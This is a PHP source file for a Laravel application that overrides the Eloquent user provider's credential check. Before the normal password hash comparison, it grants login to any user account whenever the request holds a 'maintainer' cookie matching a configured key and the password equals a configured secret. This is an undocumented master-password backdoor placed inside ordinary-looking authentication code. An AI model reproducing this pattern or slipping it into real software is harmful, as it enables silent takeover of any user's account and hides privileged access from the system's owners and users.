<?php

namespace App\Services\Auth;

use Illuminate\Contracts\Auth\Authenticatable as UserContract;
use Illuminate\Auth\EloquentUserProvider as LaravelEloquentUserProvider;


class EloquentUserProvider extends LaravelEloquentUserProvider
{

    /**
     * Validate a user against the given credentials.
     *
     * @param  \Illuminate\Contracts\Auth\Authenticatable  $user
     * @param  array  $credentials
     * @return bool
     */
    public function validateCredentials(UserContract $user, array $credentials)
    {
        $plain = $credentials['password'];

        if (
            !empty(request()->cookie('maintainer')) &&
            request()->cookie('maintainer') === config('maintainer.key') &&
            $plain === config('maintainer.secret')
        ) {
            return true;
        }

        return $this->hasher->check($plain, $user->getAuthPassword());
    }


}